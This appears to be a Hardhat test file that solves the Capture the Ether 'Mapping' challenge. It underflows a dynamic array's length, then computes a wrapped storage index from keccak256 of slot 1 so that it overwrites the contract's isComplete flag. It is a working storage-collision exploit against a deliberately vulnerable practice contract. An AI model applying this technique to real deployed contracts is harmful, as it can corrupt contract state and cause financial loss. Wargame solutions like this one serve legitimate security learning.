import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, constants, Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('MappingChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (await ethers.getContractFactory('MappingChallenge', deployer)).deploy();

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    await target.set(
      BigNumber.from(`2`)
        .pow(`256`)
        .sub(`2`),
      `4`
    )

    const mapDataBegin = BigNumber.from(
      ethers.utils.keccak256(
        `0x0000000000000000000000000000000000000000000000000000000000000001`
      )
    )

    const isCompleteOffset = BigNumber.from(`2`)
      .pow(`256`)
      .sub(mapDataBegin)

    await target.set(isCompleteOffset, `1`)

    expect(await target.isComplete()).to.equal(true);
  });
});
